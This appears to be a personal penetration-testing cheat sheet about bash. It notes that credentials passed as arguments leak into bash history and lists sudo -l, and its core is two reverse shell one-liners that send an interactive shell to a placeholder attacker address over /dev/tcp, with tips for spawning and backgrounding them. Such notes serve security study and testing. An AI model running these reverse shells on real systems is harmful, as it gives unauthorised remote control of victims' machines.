---
tags:
  - "#type/tool"
  - "#attack/credential-access"
Link:
Purpose:
---
# Info

> [!Hint] Hint
> If a script takes **credentials as an argument**, these credentials will be visible in anyone's bash history who used the script.

# Usage

`sudo -l` list sudo privileges of the current user

# Snippets

## Simple Reverse Shell

`bash -i >& /dev/tcp/192.168.x.x/4444 0>&1`

Often its a good idea to start a bash process, that then starts a new process for the reverse shell. This way, you can be sure that a) bash is running and b) its new child process.

- E.g. if you create shell using e.g. a php system() call it might happen, that `sh` is used per default.

`bash -c "bash -i >& /dev/tcp/192.168.x.x/4444 0>&1"`

Hint: In some scenarios it makes sense to run the revshell in the backround --> append a `&`.

## Get directory of executed script

Use this snippet to reliably get the absolute, canonical path of the curently running script file:

`SCRIPT_DIR=$( cd -- "$( dirname -- "${BASH_SOURCE[0]}" )" &> /dev/null && pwd )`
